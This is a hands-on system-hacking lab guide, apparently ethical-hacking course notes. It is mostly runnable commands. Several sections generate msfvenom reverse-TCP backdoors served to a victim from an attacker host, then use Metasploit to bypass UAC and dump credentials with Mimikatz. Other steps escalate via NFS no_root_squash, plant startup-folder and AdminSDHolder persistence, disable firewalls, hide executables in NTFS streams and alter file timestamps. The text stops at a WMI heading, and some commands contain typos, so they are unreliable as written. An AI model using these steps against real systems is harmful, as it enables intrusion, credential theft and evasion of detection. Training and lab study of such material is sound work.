# System Hacking

- System hacking involves testing computer systems and software for security vulnerabilities that could be exploited by attackers to gain unauthorized access and misuse sensitive information. This process is crucial in identifying weaknesses and predicting the effectiveness of security measures.

- Now we can focus on system hacking after gathering information through techniques like footprinting, scanning, enumeration, and vulnerability analysis. The objective is to monitor a target system remotely and perform tasks such as bypassing access controls, privilege escalation, creating/maintaining remote access, and hiding malicious activities.

## Objective

- The primary goal is to perform ethical hacking activities on the target system, utilizing the information collected in earlier phases. This includes techniques like password cracking, vulnerability exploitation, privilege escalation, maintaining remote access, and clearing logs.

## Overview of System Hacking

System hacking follows a methodology involving four main steps:
1. **Gaining Access:** Techniques include password cracking and exploiting vulnerabilities.
2. **Escalating Privileges:** Exploiting vulnerabilities to escalate privileges.
3. **Maintaining Access:** Performing malicious activities while maintaining access.
4. **Clearing Logs:** Wiping out entries corresponding to malicious activities to avoid detection.

## Methods

#### 1. Gain Access to the System:
   - Perform Active Online Attack to Crack the System's Password using Responder.
   - Audit System Passwords using LOphtCrack.
   - Find Vulnerabilities on Exploit Sites.
   - Exploit Client-Side Vulnerabilities and Establish a VNC Session.
   - Gain Access to a Remote System using Armitage.
   - Gain Access to a Remote System using Ninja Jonin.
   - Perform Buffer Overflow Attack to Gain Access to a Remote System.

#### 2. Privilege Escalation to Gain Higher Privileges:
   - Escalate Privileges using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities.
   - Hack a Windows Machine using Metasploit and Perform Post-Exploitation using Meterpreter.
   - Escalate Privileges by Exploiting Vulnerability in pkexec.
   - Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS.
   - Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys.
   - Escalate Privileges to Gather Hashdump using Mimikatz.

#### 3. Maintain Remote Access and Hide Malicious Activities:
   - User System Monitoring and Surveillance using Power Spy.
   - User System Monitoring and Surveillance using Spytech SpyAgent.
   - Hide Files using NTFS Streams.
   - Hide Data using White Space Steganography.
   - Image Steganography using OpenStego and StegOnline.
   - Maintain Persistence by Abusing Boot or Logon Autostart Execution.
   - Maintain Domain Persistence by Exploiting Active Directory Objects.
   - Privilege Escalation and Maintain Persistence using WMI.
   - Covert Channels using Covert_TCP.

#### 4. Clear Logs to Hide the Evidence of Compromise:
   - View, Enable, and Clear Audit Policies using Auditpol.
   - Clear Windows Machine Logs using Various Utilities.
   - Clear Linux Machine Logs using the BASH Shell.
   - Hiding Artifacts in Windows and Linux Machines.
   - Clear Windows Machine Logs using CCleaner.

---

### 1. Gaining Access to the System

- Gaining access involves the unauthorized entry into a target system to modify or steal sensitive information.

- For ethical hackers and penetration testers, the initial step in system hacking is gaining access to a target system using obtained information and identified loopholes in the access control mechanism. This involves employing techniques like password cracking, vulnerability exploitation, and social engineering.

**Password Cracking:**

- Password cracking is the retrieval of passwords from transmitted or stored data. While it serves legitimate purposes, attackers leverage it to gain unauthorized access. It is a critical phase in system hacking, often commencing the hacking process. Weak or easily guessable passwords make most password cracking attempts successful.

**Vulnerability Exploitation:**

- Exploiting vulnerabilities involves executing complex, interrelated steps to gain access to a remote system. Attackers use discovered vulnerabilities to develop and deliver exploits.

**Overview of Gaining Access**

- Previous hacking phases (footprinting, reconnaissance, scanning, enumeration, and vulnerability assessment) identify security loopholes. This information is then utilized to gain access using techniques like password cracking and vulnerability exploitation.

---

#### Perform Active Online Attack to Crack the System's Password using Responder

- LLMNR (Link Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) play crucial roles in Windows OSes for name resolution on the same link. These services, enabled by default in Windows OSes, can be exploited to extract password hashes from a user.

- [Responder](https://github.com/SpiderLabs/Responder) is an LLMNR, NBT-NS, and MDNS poisoner. It responds to specific NBT-NS queries, primarily for the File Server Service (SMB). We can utilize Responder to extract information like the target system's OS version, client version, NTLM client IP address, and NTLM username/password hash.

##### Steps

- Grant permissions to the Responder script.

   ```bash
   chmod +x ./Responder.py
   ```

- Run Responder with sudo.

   ```bash
   sudo ./Responder.py -I ens3
   sudo ./Responder.py -I ens3 -wF -v
   ```

   *Note: Interface may vary; check with `ifconfig`. and also refer this article: [LLMNR & NBT-NS Poisoning and Credential Access using Responder](https://www.cynet.com/attack-techniques-hands-on/llmnr-nbt-ns-poisoning-and-credential-access-using-responder/)*

- On victim machine, open the Run window (Win + R) and enter  e.g., `\\Attacker-Tools`.

- Observe Responder capturing access logs on attacker machine.

- Responder stores logs in `~/Responder/Logs`. Open the log file.

- Crack the hashes using John the Ripper.

   ```bash
   sudo john ~/Responder/Logs/[LogFileName.txt]
   ```

- John the Ripper will display the cracked password.

---

#### Find Vulnerabilities on Exploit Sites

- Exploit sites contain the details of the latest vulnerabilities of various OSes, devices, and applications. You can use these sites to find relevant vulnerabilities about the target system based on the information gathered, and further download the exploits from the database and use exploitation tools such as Metasploit, to gain remote access.

##### Steps:

- Visit [Exploit Database](https://www.exploitdb.com/)

- The Exploit Database website appears; you can click any of the latest vulnerabilities to view detailed information, or you can search for a specific vulnerability by entering its name in the Search field.

- In the website, select the `SEARCH EDB` option from the list to perform the advanced search.

- The Exploit Database Advanced Search page appears. In the Type field, select any type from the drop-down list (e.g., remote). Similarly, in the Platform field, select any OS (e.g., Windows_x86-64). Click Search.

- Scroll down to view the result, which displays a list of vulnerabilities.

- You can click on any vulnerability to view its detailed information.

- Detailed information regarding the selected vulnerability such as CVE ID, author, type, platform, and published data is displayed.

- You can click on the download icon in the Exploit section to download the exploit code.

- This exploit code can further be used to exploit vulnerabilities in the target system.

- You can similarly use other exploit sites such as [VulDB](https://vuldb.com), [MITRE CVE](https://cve.mitre.org), [Vulners](https://vulners.com), and [CIRCL CVE Search](https://cve.circl.lu) to find target system vulnerabilities.

---

#### Exploit Client-Side Vulnerabilities and Establish a VNC Session

Attackers leverage client-side vulnerabilities to gain access to target machines. VNC (Virtual Network Computing) enables remote access and control of computers. Here, we demonstrates exploiting a weakly patched Windows machine to gain unauthorized access through a remote desktop connection using Metasploit.

##### Steps

- Generate Malicious File:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.10.1.13 LPORT=444 -o /home/attacker/Desktop/Test.exe
   ```

- Share Malicious File:
   ```bash
   mkdir /var/www/html/share
   chmod -R 755 /var/www/html/share
   chown -R www-data:www-data /var/www/html/share
   cp /home/attacker/Desktop/Test.exe /var/www/html/share
   ```

- Start Apache Service:
   ```bash
   service apache2 start
   ```

- Launch Metasploit:
   ```bash
   msfconsole
   ```

- Set Up Metasploit:
   ```bash
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST 10.10.1.13
   set LPORT 444
   exploit
   ```

- Access Malicious File on victim windows machine:
   - Open the web browser and navigate to http://10.10.1.13/share.
   - Download the Test.exe file.

- Run Exploit:
   - Double-click Test.exe on victim machine.

- Verify Access:
   - Observe Meterpreter session.
   ```bash
   sysinfo
   ```

- Upload PowerUp.ps1:
   ```bash
   upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1
   ```

- Run PowerUp.ps1:
   ```bash
   shell
   powershell -ExecutionPolicy Bypass -Command .\PowerUp.ps1; Invoke-AllChecks
   ```

- Exploit VNC Vulnerability:
   ```bash
   exit
   run vnc
   ```

- Access VNC Session:
   - Observe the opened VNC session.

Here, we exploited client-side vulnerabilities and established a VNC session using Metasploit.

---

#### Gain Access to a Remote System using Armitage

- [Armitage](https://github.com/r00t0v3rr1d3/armitage) is a scriptable red team collaboration tool for Metasploit that visualizes targets, recommends exploits, and exposes the advanced post-exploitation features in the framework. Using this tool, you can create sessions, share hosts, capture data, downloaded files, communicate through a shared event log, and run bots to automate pen testing tasks.
##### Steps

- In the Terminal window, type `service postgresql start` and press Enter to start the database service.
- Navigate to `Applications -> Pentesting Exploitation Tools -> Metasploit Framework -> Armitage` to launch the Armitage tool.

- Click on `Hosts` from the Menu bar and navigate to `Nmap Scan -> Intense Scan` to scan for live hosts in the network.

- The Input pop-up appears. Type a target IP address (e.g., 10.10.1.11) and click `OK`.

- After the completion of scan, a Message pop-up appears, click `OK`.

- Observe that the target host (10.10.1.11) appears on the screen.

- Now, from the left-hand pane, expand the payload node, and then navigate to `windows -> meterpreter`; double-click `meterpreter_reverse_tcp`.

- The `windows/meterpreter_reverse_tcp` window appears. Scroll down to the `LPORT` Option, and change the port Value to `444`. In the Output field, select `exe` from the dropdown options; click `Launch`.

- The Save window appears. Select `Desktop` as the location, set the File Name as `malicious_payload.exe`, and click the `Save` button.

- In the previous task, we already created a directory or shared folder (`share`) at the location (`/var/www/html`) with the required access permission. So, we will use the same directory or shared folder (`share`) to share `malicious_payload.exe` with the victim machine.

**Note:** If you want to create a new directory to share the `malicious_payload.exe` file with the target machine and provide the permissions, use the below commands:
- Type `mkdir /var/www/html/share` and press Enter to create a shared folder
- Type `chmod -R 755 /var/www/html/share` and press Enter
- Type `chown -R www-data:www-data /var/www/html/share` and press Enter

- In the Terminal window, type `cp malicious_payload.exe /var/www/html/share/`, and press Enter to copy the file to the shared folder.

- Type `service apache2 start` and press Enter to start the Apache server.

- Switch back to the Armitage window. In the left-hand pane, double-click `meterpreter_reverse_tcp`.

- The `windows/meterpreter_reverse_tcp` window appears. Scroll down to `LPORT` Option and change the port Value to `444`. Ensure that the `multi/handler` option is selected in the Output field; click `Launch`.

- Now, switch to victim machine and open any web browser and visit `http://10.10.1.13/share`

- Download and run `malicious_payload.exe`

- On the attacker machine, observe that one session has been created or opened in the Meterpreter shell, and the host icon displays the target system name (e.g., WINDOWS11).

- Interact with the Meterpreter Shell.

- A new Meterpreter tab appears. Type `sysinfo` and press Enter to view the system details of the exploited system.

- A new Files tab and the present working directory of the target system appear. You can observe the files present in the Download folder of the target system.

- Using this option, you can perform various functions such as uploading a file, making a directory, and listing all drives present in the target system.

- Similarly, you can explore other options such as Desktop (VNC), Show Processes, Log Keystrokes, and Webcam Shot.

- You can also escalate privileges in the target system using the `Escalate Privileges` option and further steal tokens, dump hashes, or perform other activities.

---

### 2. Privilege Escalation to Gain Higher Privileges

- Privilege escalation involves using a non-admin user account to gain higher access levels in the target system, including admin privileges.

- As a professional ethical hacker or pen tester, the second step in system hacking is to escalate privileges using user account passwords obtained in the first step. Various techniques, such as named pipe impersonation, misconfigured service exploitation, pivoting, and relaying, will be employed to gain higher privileges on the target system.

**Privilege Escalation Overview**

- Privilege escalation is the process of acquiring more privileges than initially obtained, exploiting design flaws, programming errors, bugs, and configuration oversights in the OS and software applications.

- Backdoors, containing trojans or infectious applications, are employed to gain remote access to the target system. These backdoors can be distributed through email, file-sharing web applications, or shared network drives. Once executed by a user, access to the affected machine is obtained for activities like keylogging and sensitive data extraction.

- Privileges restrict user access to specific programs, features, OSes, functions, files, or codes. Privilege escalation is necessary when unauthorized access to system resources is desired, occurring in two forms:

    - **Horizontal Privilege Escalation:** Unauthorized access to resources and functions of an authorized user with similar access permissions.
    - **Vertical Privilege Escalation:** Unauthorized access to resources and functions of a user with higher privileges, such as an application or site administrator.

---

#### Escalate Privileges using Privilege Escalation Tools and Exploit Client-Side Vulnerabilities

##### Privilege Escalation with Meterpreter

- Creating a Malicious Executable:
   - Generate a Meterpreter payload with the command:
     ```bash
     msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > Exploit.exe
     ```
   - Share the executable in a shared folder (`/var/www/html/share/`).

- Starting Apache Server:
   - If needed, create a shared folder with:
     ```bash
     mkdir /var/www/html/share
     chmod -R 755 /var/www/html/share
     chown -R www-data:www-data /var/www/html/share
     ```
   - Check the shared folder with `ls -la /var/www/html/ | grep share`.
   - Copy the Exploit.exe to the shared folder with:
     ```bash
     cp Exploit.exe /var/www/html/share/
     ```
   - Start the Apache server with `service apache2 start`.

- Launching Metasploit:
   - Open a new terminal window and run `msfconsole`.
   - Use the exploit handler with:
     ```bash
     use exploit/multi/handler
     ```

- Configuring Payload and Starting Handler:
     ```bash
     set payload windows/meterpreter/reverse_tcp
     set LHOST 10.10.1.13
     ```
   - Start the handler with `exploit -j -z`.

- Victim Machine Interaction:
   - On victim machine, visit `http://10.10.1.13/share` to view the shared folder.
   - Download and execute Exploit.exe.

- Meterpreter Session:
   - In attacker machine, see the Meterpreter session.
   - Interact with the session by typing:
     ```bash
     sessions -i 1
     ```

##### Bypassing UAC and Privilege Escalation

- Backgrounding and UAC Bypass:
    - Background the Meterpreter session with `background`.
    - Use the `bypassuac_fodhelper` exploit with:
      ```bash
      use exploit/windows/local/bypassuac_fodhelper
      ```

- Configuring Payload for UAC Bypass:
    - Set the session with `set SESSION 1`.
    - Set the payload with:
      ```bash
      set payload windows/meterpreter/reverse_tcp
      ```

- Executing UAC Bypass:
    - Configure LHOST with `set LHOST 10.10.1.13`.
    - Execute the exploit with `exploit`.

- Checking Elevated Privileges:
    - Check the Meterpreter user ID with `getuid`.
    - Elevate privileges with `getsystem -t 1`.

- Final Note:
    - Observe elevated privileges and continue with further assessments.

---

#### Hack a Windows Machine using Metasploit and Perform Post-Exploitation using Meterpreter

- The Metasploit Framework is a powerful tool for developing and executing exploit code against remote target machines. It provides a modular penetration testing platform in Ruby, allowing the writing, testing, and execution of exploit code. Meterpreter, an attack payload within Metasploit, offers an interactive shell to explore and execute code on the target machine.

##### Steps

**Generating Malicious Payload and Sharing it**

- Generate Backdoor.exe using Metasploit:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Backdoor.exe
   ```

- Share Backdoor.exe with the target machine:
   ```bash
   mkdir /var/www/html/share
   chmod -R 755 /var/www/html/share
   chown -R www-data:www-data /var/www/html/share
   cp Backdoor.exe /var/www/html/share/
   service apache2 start
   ```

**Exploiting Victim Machine**

- Launch Metasploit:
   ```bash
   msfconsole
   ```

- In Metasploit:
    ```bash
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST 10.10.1.13
    show options
    exploit -j -z
    ```

- On Victim machine, open a web browser, and visit `http://10.10.1.13/share`. Download Backdoor.exe.

**Post-Exploitation with Meterpreter**

- In attacker machine, check for the opened Meterpreter session:
    ```bash
    sessions -i 1
    ```

- Explore the compromised victim machine:
    ```bash
    sysinfo
    ipconfig
    getuid
    pwd
    ls
    cat Secret.txt
    ```

- Change MACE attributes of Secret.txt:
    ```bash
    timestomp Secret.txt -v
    timestomp Secret.txt -m "02/11/2018 08:10:03"
    ```

- Additional Post Exploitation Commands:

---

| Post Exploitation Commands                         | Description                                      |
|---------------------------------------------------|--------------------------------------------------|
| `net start` or `stop`                              | Starts or stops a network service                |
| `netsh advfirewall set currentprofile state off`   | Turn off firewall service for the current profile |
| `netsh advfirewall set allprofiles state off`      | Turn off firewall service for all profiles        |
| `findstr /E ".txt" > txt.txt`                     | Retrieves all text files (requires privileged access) |
| `findstr /E ".log" > log.txt`                     | Retrieves all log files                          |
| `findstr /E ".doc" > doc.txt`                     | Retrieves all document files                     |
| `search -f pagefile.sys`                          | Search for files                                 |
| `keyscan_start`                                   | Start keylogging                                 |
| `keyscan_dump`                                    | Dump captured keystrokes                         |
| `dir /a:h`                                        | List directories with hidden attributes          |
| `sc queryex type=service state=all`               | List available services                          |
| `netsh firewall show state`                       | Check firewall state                             |
| `netsh firewall show config`                      | View firewall settings                           |
| `wmic product get name,version,vendor`            | View installed software details                  |
| `wmic cpu get`                                    | View processor details                           |
| `wmic useraccount get name,sid`                   | Retrieve user names and SIDs                      |
| `wmic os where Primary='TRUE' reboot`             | Reboot the target system                          |

---

- Observe that the Meterpreter session terminates when the victim machine is shut down.

---

#### Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS

- Network File System (NFS) is a protocol that enables users to access files remotely through a network. Remote NFS can be accessed locally when the shares are mounted. If NFS is misconfigured, it can lead to unauthorized access to sensitive data or obtain a shell on a system.

##### Steps

- **In Victim Machine:**
  - Install NFS service:
    ```bash
    sudo apt-get update
    sudo apt install nfs-kernel-server
    ```
  - Open the exports file:
    ```bash
    sudo nano /etc/exports
    ```
    Add the following line: `/home *(rw,no_root_squash)`
    Save and exit.
  - Restart the NFS server:
    ```bash
    sudo /etc/init.d/nfs-kernel-server restart
    ```

- **In Attacker machine:**
  - Run an Nmap scan on the target machine:
    ```bash
    nmap -sV 10.10.1.9
    ```
  - Install NFS client:
    ```bash
    sudo apt-get install nfs-common
    ```

  - Check available shares on the target:
    ```bash
    showmount -e 10.10.1.9
    ```

  - Create a local directory and mount the NFS share:
    ```bash
    mkdir /tmp/nfs
    sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
    ```

  - Navigate to the mounted directory:
    ```bash
    cd /tmp/nfs
    ```

  - Escalate privileges:
    ```bash
    sudo cp /bin/bash .
    sudo chmod +s bash
    ```

  - Open a bash shell on the target machine:
    ```bash
    ./bash -p
    ```

  - Check for root access:
    ```bash
    whoami
    ```

  - Install nano editor on the target machine:
    ```bash
    cp /bin/nano .
    chmod 4777 nano
    ```

  - View running cron jobs:
    ```bash
    cat /etc/crontab
    ```

  - View current processes:
    ```bash
    ps -ef
    ```

  - View .txt files on the system:
    ```bash
    find / -name "*.txt" 2> /dev/null
    ```

  - View host/network names in numeric form:
    ```bash
    route -n
    ```

  - View SUID executable binaries:
    ```bash
    find / -perm -4000 2> /dev/null
    ```

---

#### Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys

- Sticky keys, a Windows accessibility feature, can be exploited to gain unauthenticated, privileged access to a machine.

##### Steps

- Generate Payload:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=444 -f exe > Windows.exe
  ```

- Prepare Shared Folder:
  - Create a shared folder:
    ```bash
    mkdir /var/www/html/share
    ```
  - Set permissions:
    ```bash
    chmod -R 755 /var/www/html/share
    chown -R www-data:www-data /var/www/html/share
    ```

- Copy Payload to Shared Folder:
  ```bash
  cp Windows.exe /var/www/html/share/
  ```

- Start Apache Server:
  ```bash
  service apache2 start
  ```

- Launch Metasploit Framework:
  ```bash
  msfconsole
  ```

- Metasploit Configuration:
  ```bash
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set LHOST 10.10.1.13
  set LPORT 444
  run
  ```

- Access Shared Folder from Victim machine:
  - Open a web browser and navigate to http://10.10.1.13/share
  - Download and run Windows.exe

- Metasploit Commands:
  - Observe the meterpreter connection
  - Execute commands:
    ```bash
    sysinfo
    getuid
    ```

- Bypass UAC:
  ```bash
  background
  search bypassuac_fodhelper
  use exploit/windows/local/bypassuac_fodhelper
  set session 1
  show options
  set LHOST 10.10.1.13
  set TARGET 0
  exploit
  ```

- Elevate Privileges:
  ```bash
  getsystem -t 1
  getuid
  ```

- Exploit Sticky Keys:
  ```bash
  use post/windows/manage/sticky_keys
  sessions -i
  set session 2
  exploit
  ```

- Verify Access:
  - Switch to Victim machine and open a command prompt.
  - Type `whoami` to confirm system-level access.
  - Persistent system-level access achieved through Sticky Keys exploit.

---

#### Escalate Privileges to Gather Hashdump using Mimikatz

- Mimikatz is a powerful post-exploitation tool designed to extract and manipulate authentication credentials. We can use Metasploit's Mimikatz module to dump hashes from the target machine, ultimately leading to escalating privileges.

##### Steps

- Generate Malicious Payload:
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.13 LPORT=444 -f exe > backdoor.exe
  ```

- Prepare Shared Folder:
  - Use the existing shared folder (/var/www/html/share):
   ```bash
   mkdir /var/www/html/share
   chmod -R 755 /var/www/html/share
   chown -R www-data:www-data /var/www/html/share
   ```

- Copy Payload to Shared Folder:
   ```bash
   cp backdoor.exe /var/www/html/share/
   ```

- Start Apache Server:
  ```bash
  service apache2 start
  ```

- Launch Metasploit:
   - Open a new Terminal and type:
   ```bash
   msfconsole
   ```

- Metasploit Configuration:
  - Configure Metasploit settings:
   ```bash
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set LHOST 10.10.1.13
   set LPORT 444
   run
   ```

- Victim Interaction:
  - Switch to Victim machine.
  - Open a browser and visit http://10.10.1.13/share.
  - Download and run the backdoor.exe.

- Exploit Successful:
  - Switch back to Attacker machine.
  - Meterpreter session established.
  - Retrieve system info: `sysinfo`.
  - Check current user ID: `getuid`.

- Bypass UAC Protection:
  - Background the current session: `background`.
  - Use FodHelper Registry Key exploit:
   ```bash
   use exploit/windows/local/bypassuac_fodhelper
   set session 1
   show options
   set LHOST 10.10.1.13
   set TARGET 0
   exploit
   ```

- Elevate Privileges:
  - Elevate to system privileges:
   ```bash
   getsystem -t 1
   ```

- Load Mimikatz:
  - Load Mimikatz in Metasploit console:
   ```bash
   load kiwi
   help kiwi
   ```

- Retrieve Hashes:
  - Use Mimikatz to dump NTLM hashes:
   ```bash
   creds all
   creds kerberos
   Isa_dump_sam
   ```

- Change Admin Password:
  - Change Admin password:
   ```bash
   password_change -u Admin -n [NTLM hash] -P new_password
   ```

- Verify Password Change:
  - Confirm the password change:
   ```bash
   Isa_dump_sam
   ```

- Test Login:
  - Switch to Victim machine.
  - Lock the machine and log in with the new password.

---
### 3. Maintain Remote Access and Hide Malicious Activities

- Remote code execution techniques are diverse tactics used to execute malicious code on a remote system, ensuring continued access. As a professional ethical hacker or pen tester, after gaining access and escalating privileges, the next step is to maintain access for further exploitation.

- Now, the goal is to remotely execute malicious applications like keyloggers, spyware, backdoors, etc., hiding them using methods such as rootkits, steganography, and NTFS data streams. Maintaining access is crucial for identifying security flaws, monitoring computer activities, and assessing the effectiveness of additional security measures.

**Remote Access**

Remote code execution techniques are often performed after initially compromising a system and further expanding access to remote systems present on the target network. 

- Remote code execution techniques:
   - Exploitation for client execution
   - Scheduled task
   - Service execution
   - Windows Management Instrumentation (WMI)
   - Windows Remote Management (WinRM)

**Hiding Files**

- Hiding files involves concealing malicious programs using methods such as rootkits, NTFS streams, and steganography techniques. This prevents detection by protective applications like Antivirus, Anti-malware, and Anti-spyware, maintaining future access without the victim's consent.

---
#### Hide Files using NTFS Streams

##### Steps

Check and verify that the `C:` drive is in NTFS format: Right-click on Local Disk (`C:`) in This PC, and click Properties.

**Prepare Folder and Files**

   - Create a new folder named "magic" on the C: drive.
   - Copy `calc.exe` from `C:\Windows\System32` and paste it into `C:\magic`.

**Command Prompt Operations**

   - Open command prompt and Navigate to the magic folder using `cd C:\magic`.
   - Create a new file `readme.txt` using `notepad readme.txt` and write some text (e.g., HELLO WORLD!!).
   - Save and close the `readme.txt` file.

**Hide Files with NTFS Streams**

   - In Command Prompt, list files with `dir` and note `readme.txt` size.
   - Execute `type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe` to hide `calc.exe` inside `readme.txt`.
   - List files again with `dir` and confirm no change in `readme.txt` size.

**Execution**

   - Navigate to `C:\magic`, delete `calc.exe`.
   - Create a symbolic link using `mklink backdoor.exe readme.txt:calc.exe`.
   - Execute `backdoor.exe` to run the calculator program.

**Note:** In real-world scenarios, attackers might use NTFS streams to hide malicious files and execute them remotely, keeping them invisible to legitimate users.

---

#### Hide Data using White Space Steganography

- Download and install [snow](https://darkside.com.au/snow/)

**Create Text File for Hiding Data**

- Create a Notepad file with the text "Hello World!" and draw a dashed line below it by long-pressing the hyphen key.
- Save the file as `readme.txt` in the Snow folder.

**Use Snow for Whitespace Steganography**

- Open Command Prompt and navigate to the Snow folder
- Execute `snow -C -m "My Swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt`.
   - Note: Use your desired password; `readme2.txt` is the output file.
- The data is now hidden inside `readme2.txt` with the contents of `readme.txt`.
- Execute `snow -C -p "magic" readme2.txt` to reveal the hidden content using the password.

- Open `readme2.txt` in Notepad, go to Edit - Select All, and observe hidden data in the form of spaces and tabs.

---

#### OpenStego Image Steganography

**In OpenStego:**

- Click the ellipsis button next to Message File, select `New Text Document.txt` in `C:\OpenStego`, and click Open.
- Click the ellipsis button next to Cover File, select e.g., `Island.jpg`, and click Open.
- Click the ellipsis button next to Output Stego File, choose Desktop as the location, provide the file name as `Stego`, and click Open.
- Click Hide Data, and after successful embedding, minimize OpenStego.
- Double-click `Stego.bmp` on the Desktop to view the image with hidden text.
- Switch back to OpenStego, click Extract Data, select `Stego.bmp` as the Input Stego File, choose Desktop as the Output Folder, and click Extract Data.
- View the extracted text file (`New Text Document.txt`) on the Desktop.

#### StegOnline Image Steganography

- Go to `https://stegonline.georgeom.net/upload`.
- Upload `image.jpg`
- On the Image Options page, click Embed Files/Data.
- Check checkboxes under row 7, columns R, G, and B. (any row, just remember it)
- Scroll down to Input Data, select Text, type "Hello World!!!", and click Go.
- Save the image as `StegoOnline.png` from the Output section.
- Open a new tab, go to `https://stegonline.georgeom.net/upload`, and upload `StegoOnline.png`.
- On the Extract Data page, check checkboxes under row 7 and columns R, G, and B.
- Scroll down, click Go, and view the extracted data under Results.
- Download the extracted data if needed.

- Other tools like QuickStego, SSuite Picsel, CryptaPix, and gifshuffle can also be used for image steganography.

---

#### Maintain Persistence by Abusing Boot or Logon Autostart Execution

Here, we will exploit a misconfigured startup folder to gain privileged access and maintain persistence on the target machine.

##### Steps

**Setup and Initial Payload:**

- Generate a payload using the command:
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp Lhost=10.10.1.13 Lport=4444 -f exe > exploit.exe
    ```
- Create a shared folder for the exploit: 
    ```bash
    mkdir /var/www/html/share
    chmod -R 755 /var/www/html/share
    chown -R www-data:www-data /var/www/html/share
    ```
- Copy the payload to the shared folder:
    ```bash
    cp exploit.exe /var/www/html/share/
    ```

**Launch Exploit and Gain Initial Access:**

- Start the Apache server: `service apache2 start`.
- Open a new terminal and launch Metasploit: `msfconsole`.
- In Metasploit, set up the exploit:
    ```bash
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set Lhost 10.10.1.13
    set Lport 4444
    run
    ```
- On victim machine, open a web browser, navigate to `http://10.10.1.13/share/`, and download the exploit file and run it.

**Elevate Privileges and Maintain Persistence:**

- Back in Metasploit, observe the opened Meterpreter session.
- Bypass UAC using the FodHelper Registry Key:
    ```bash
    background
    use exploit/windows/local/bypassuac_fodhelper
    set session 1
    show options
    set LHOST 10.10.1.13
    set TARGET 0
    exploit
    ```
- Once the session is opened, elevate privileges:
    ```bash
    getsystem -t 1
    getuid
    ```
- Navigate to the Startup folder:
    ```bash
    cd "C:\\ProgramData\\Start Menu\\Programs\\Startup"
    pwd
    ```
- Create a new payload for startup:
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp Lhost=10.10.1.13 Lport=8080 -f exe > payload.exe
    ```
- Upload the payload to the startup folder:
    ```bash
    upload /home/attacker/payload.exe
    ```

**Test Persistence**

- Switch to the Victim machine, sign in as Admin, and restart the system.
- After restart, switch back to attacker machine.
- Open a new terminal and launch Metasploit.
- Set up the handler again and exploit:
    ```bash
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST 10.10.1.13
    set LPORT 8080
    exploit
    ```

---

#### Maintain Domain Persistence by Exploiting Active Directory Objects

- AdminSDHolder, an Active Directory container, possesses default security permissions and serves as a template for AD accounts and groups like Domain Admins, Enterprise Admins, etc. Its purpose is to safeguard these entities from unintended permission modifications. By adding a user to AdminSDHolder's access control list, they acquire "GenericAll" permissions, equivalent to domain administrators.

**Exploiting Active Directory Objects:**

- Generate Payload
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp Lhost=10.10.1.13 Lport=444 -f exe > Exploit.exe
   ```

- Prepare Shared Folder
   - Create a shared folder: `mkdir /var/www/html/share`
   - Set permissions: `chmod -R 755 /var/www/html/share`
   - Copy payload: `cp /home/attacker/Desktop/Exploit.exe /var/www/html/share/`

- Start Apache Server
   ```bash
   service apache2 start
   ```

- Launch Metasploit Framework
   ```bash
   msfconsole
   use exploit/multi/handler
   set payload windows/meterpreter/reverse_tcp
   set Lhost 10.10.1.13
   set Lport 444
   run
   ```

- Victim Interaction
   - On victim machine, visit `http://10.10.1.13/share`, download and execute Exploit.exe.

- Meterpreter Shell
   - Back in attacker machine, observe meterpreter session.
   - Check admin access: `getuid`

- Upload PowerTools
   ```bash
   upload -r PowerTools C:\\Users\\Administrator\\Downloads
   ```

- PowerShell Access and ACL Modification
   ```bash
   shell
   cd C:\Windows\System32
   powershell
   ```

- Navigate and Import PowerView
   ```powershell
   cd C:\Users\Administrator\Downloads\PowerTools\PowerView
   Import-Module ./powerview.psml
   ```

- Add User to AdminSDHolder
   ```powershell
   Add-ObjectAcI -TargetADSprefix 'CN=AdminSDHolder,CN=System' PrincipalSamAccountName Martin -Verbose -Rights All
   ```

- Check Permissions
   ```powershell
   Get-ObjectAcI -SamAccountName "Martin" -ResolveGUIDs
   ```

- Reduce SDProp Interval (Optional)
   ```bash
   REG ADD /V AdminSDProtectFrequency /T REG DWORD /F /D 300
   ```

- Verify Persistence
   - On victim machine, check if Martin is added to Domain Admins.
   - Sign in as Martin and access the Domain Controller.

- Additional PowerView Commands

---

| Commands                                  | Description                                    |
|-------------------------------------------|------------------------------------------------|
| `Get-NetDomain`                           | Retrieve info on the current domain and DCs.   |
| `Get-DomainPolicy`                        | Retrieve the policy used by the current domain.|
| `Get-NetDomainController`                 | Retrieve info on the current domain controller.|
| `Get-NetUser`                             | Retrieve info on domain users.                  |
| `Get-NetComputer`                         | List all computers in the current domain.      |
| `Get-NetGroup`                            | List all groups in the current domain.         |
| `Invoke-ShareFinder`                      | Retrieve shares on hosts in the current domain.|
| `Get-NetGPO`                              | List all GPOs in the current domain.           |
| `Get-NetGPO -ResolveGUIDs -Name $GPO.Name`| Users with modification rights for a group.    |

---

#### Privilege Escalation and Maintain Persistence using WMI

